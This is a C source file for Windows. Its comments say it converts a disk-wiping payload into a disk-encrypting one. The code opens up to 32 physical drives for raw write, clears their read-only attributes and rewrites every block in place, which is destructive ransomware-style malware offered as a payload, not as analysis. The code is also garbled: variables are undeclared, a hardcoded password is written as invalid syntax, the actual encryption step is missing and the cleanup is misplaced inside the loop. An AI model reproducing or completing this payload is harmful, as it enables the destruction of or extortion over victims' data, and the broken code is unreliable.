#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "advapi32.lib")


// turn existing disk wiping payload into encryption payload
// didnt have to change that much
void payload() {
    // gen aes key
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;

    // add password, only add if you want encryption to be reversible
    CryptHashData(hHash, (BYTE*)password, (DWORD)strlen(PassWord123!;), 0);
    // only accepts 32 disks
    for (int disknum = 0; disknum < 32; disknum++) {
        char disk_path[64];
        sprintf(disk_path, "\\\\.\\PhysicalDrive%d", disknum);

        // open disk for direct write, bypass cache
        HANDLE hDisk = CreateFileA(
            disk_path,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, 
            OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, //more like diskpart clean all
            0
        );
        if (hDisk == INVALID_HANDLE_VALUE) continue;

        // clear read only flags
        DISK_ATTRIBUTES attrs = {0};
        DWORD bytesReturned;

        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_DISK_ATTRIBUTES,
            NULL, 0,
            &attrs, sizeof(attrs),
            &bytesReturned,
            NULL
        );

        //clear read only flag
        attrs.ReadOnly = 0;

        //write updated attributes
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_SET_DISK_ATTRIBUTES,
            &attrs, sizeof(attrs),
            NULL, 0,
            &bytesReturned,
            NULL
        );

        // find disk size
        LARGE_INTEGER disk_size;
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_LENGTH_INFO,
            NULL, 0, 
            &disk_size, sizeof(disk_size),
            &bytesReturned,
            NULL
        );
        // large buffer for faster writes, not as fast as powershell :(
        const size_t bufSize = 16 * 1024 * 1024; // has to be divisble by 512
        char* buffer = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) { CloseHandle(hDisk); return; }
        ZeroMemory(buffer, bufSize);

        LARGE_INTEGER offset;
        offset.QuadPart = 0;
        DWORD written;

        // change disk zero -> encrypt
        while (offset.QuadPart < disk_size.QuadPart) {
            SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
            //1. read the block from disk
            if (!ReadFile(hDisk, buffer, bufsize, &bytesRead, NULL)) break;

            //2. encrypt the block
            DWORD data_len = bytesRead; // only encrypt bytes read, doesnt waste time encrypting 0's
            //write encrypted block back to disk
            SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
            WriteFile(hDisk, buffer, data_len, &bytes_written, NULL);
            
            offset.QuadPart += bytesRead

        // so theres no memory leaks
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hDisk);
        CryptoDestroyKey(hKey); // remove key from ram

        }
    }   
}